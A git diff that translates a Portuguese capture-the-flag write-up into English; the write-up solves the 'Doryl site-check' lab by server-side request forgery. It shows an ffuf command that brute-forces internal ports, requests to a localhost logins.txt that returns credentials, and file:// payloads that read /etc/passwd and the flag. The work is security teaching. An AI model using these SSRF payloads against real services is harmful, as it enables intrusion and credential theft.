@@ -10,52 +10,48 @@ date: "2024-09-05"
 draft: false
 showAuthor: false
 showAuthorsBadges: false
-summary: Resolução do desafio Doryl site-check
+summary: Resolution of the Doryl site-check challenge
 title: Write Up - Doryl Site-Check
 ---
 
 # CTF Doryl
 
-## Como acessar o desafio
+## How to access the challenge
 
-- Acesse o <https://github.com/fguisso/doryl-site-check>, e inicie o desafio na
-  sua máquina. No caso foi entregue a versão na branch `Internal`.
+- Access <https://github.com/fguisso/doryl-site-check>, and start the challenge on
+  your machine. In this case, the version delivered was on the `Internal` branch.
 
-## Descrição
+## Description
 
-O Desafio tem como objetivos:
+The challenge has the following objectives:
 
-- Encontrar um arquivo com informações muito sensiveis.
-- Encontrar uma flag no formato secDevOps{.....}
+- Find a file with very sensitive information.
+- Find a flag in the format secDevOps{.....}
 
-### Como Funciona a Aplicação
+### How the Application Works
 
-- A aplicação possui apenas um campo de entrada, utilizado para escanear a url
-  inserida:
+- The application has only one input field, used to scan the inserted URL:
 
-![aplicacao](https://i.imgur.com/ilyYRAt.png)
--Note que ele retorna a resposta completa da url que o usuário inseriu.
+![application](https://i.imgur.com/ilyYRAt.png)
+- Note that it returns the complete response of the URL that the user inserted.
 
-![print_resposta_aplicacao](https://i.imgur.com/g71XYNY.png)
-Então parece que a aplicação internamente envia requisições para a url. Nesse
-princípio é possível inserir uma URL para tentar acessar servidores internos,
-como o `http://localhost`.
+![application_response_print](https://i.imgur.com/g71XYNY.png)
+So it seems that the application internally sends requests to the URL.
+In this principle, it is possible to insert a URL to try to access internal servers,
+such as `http://localhost`.
 
-- Utilize as portas web mais utilizadas em um bruteforce, para saber se existe
-  alguma porta interna aberta:
+- Use the most commonly used web ports in a bruteforce to see if there is any internal port open:
   `80,443,8009,8180,81,300,591,593,832,981,1010,1311,2082,2087,2095,2096,2480,3000,3128,3333,4243,4567,4711,4712,4993,5000,5104,5108,5800,6543,7000,7396,7474,8000,8001,8008,8014,8042,8069,8080,8081,8088,8090,8091,8118,8123,8172,8222,8243,8280,8281,8333,8443,8500,8834,8880,8888,8983,9000,9043,9060,9080,9090,9091,9200,9443,9800,9981,12443,16080,18091,18092,20720,28017`.
 
-- Utilize o ffuf para automatizar a buscar de portas o input é enviado no
-  parâmetro `target` para o servidor, e note que filtrei as respostas que possuem
-  3246 palavras que considerei como resposta padrão do site.
+- Use ffuf to automate the port search, the input is sent in the `target` parameter to the server, and note that I filtered the responses that have 3246 words which I considered as the site's default response.
 
 `ffuf -u http://0.0.0.0:8080/check -X POST -d "target=http%3A%2F%2Flocalhost%3AFUZZ" -w ports.txt -H 'Content-Type: application/x-www-form-urlencoded' -fw 3246`
 
 ![print_ffuf_aplicacao](https://i.imgur.com/1eJAAko.png)
 
-- Note que ele encontrou apenas 2 portas abertas a 8080, que fornece o site
-  principal, e a 3000, que fornece uma aplicação interna.
-- Analise a resposta completa, quando você insere <http://localhost:3000>,
+- Note that it found only 2 open ports, 8080, which provides the main site, and 3000, which provides an internal application.
+- Analyze the complete response when you enter <http://localhost:3000>.
+
 
 ```http
 GET http://localhost:3000
@@ -69,9 +65,9 @@ Last-Modified: Thu, 05 Sep 2024 01:48:03 GMT
 </pre>
 ```
 
-- Note que ele possui um link para `logins.txt`, ao enviar a url
-  <http://localhost:3000/logins.txt> no input, ele irá retornar informações muito
-  sensíveis.
+- Note that it has a link to `logins.txt`, when you send the URL
+<http://localhost:3000/logins.txt> in the input, it will return very
+sensitive information.
 
 ```http
 GET http://localhost:3000/logins.txt
@@ -99,17 +95,17 @@ login: dorylAdmin
 password: ginAndOrange
 ```
 
-#### Primeira Etapa Concluída
+#### First Step Completed
 
-### Encontre a FLAG
+### Find the FLAG
 
-- Observe que o servidor envia uma requisição interna para a URL inserida,
-  utilizando o protocolo `http`. Com base nisso, podemos testar outros esquemas
-  comuns para acessar arquivos em servidores internos, como o esquema `file`.
+- Note that the server sends an internal request to the inserted URL,
+  using the `http` protocol. Based on this, we can test other common schemes
+  to access files on internal servers, such as the `file` scheme.
 
-- Vamos tentar recuperar um arquivo comum em servidores Linux, o `/etc/passwd`,
-  para verificar se ele retorna o conteúdo. Insira no campo de entrada a URL
-  `file:///etc/passwd`.
+- Let's try to retrieve a common file on Linux servers, the `/etc/passwd`,
+  to check if it returns the content. Enter the URL `file:///etc/passwd` in the input field.
+
 
 ```http
 GET file:///etc/passwd
@@ -131,17 +127,18 @@ postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
 cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
 ```
 
-- Essa resposta, é o conteúdo do `/etc/passwd` , então podemos tentar recuperar
-  a flag que está armazenada no sistema. É comum em ctfs a flag ficar na mesma
-  pasta do desafio e com o nome `flag.txt` , partindo deste princípio podemos
-  inserir `file://./flag.txt` .
+- This response is the content of `/etc/passwd`, so we can try to retrieve
+  the flag that is stored in the system. It is common in CTFs for the flag to be in the same
+  folder as the challenge and named `flag.txt`. Based on this principle, we can
+  enter `file://./flag.txt`.
 
 ```http
 GET file://./flag.txt
 
 SecDevOps{SSRF_3_UM_PERIGOnvim .!}
+
 ```
 
-Todos Objetivos foram concluidos ( ;
+All objectives were completed ( ;
 
-|Criador do Desafio: <https://github.com/fguisso>
+|Challenge Creator: <https://github.com/fguisso>
